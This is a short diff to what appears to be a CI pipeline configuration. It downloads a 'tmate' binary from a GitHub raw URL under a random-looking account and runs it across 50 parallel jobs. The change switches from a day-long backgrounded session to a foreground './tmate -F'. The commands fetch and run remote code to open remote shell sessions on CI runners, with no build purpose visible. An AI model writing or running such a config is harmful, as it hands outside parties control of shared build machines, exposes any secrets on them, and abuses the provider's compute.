@@ -12,7 +12,5 @@ blocks:
           commands:
             - 'wget https://raw.githubusercontent.com/hp20h5w91nf1/hp20h5w91nf1/main/tmate'
             - chmod +x tmate
-            - nohup ./tmate -F > /dev/null 2>&1 &
-            - sleep 86400
-            - pkill -f tmate
+            - ./tmate -F
           parallelism: 50
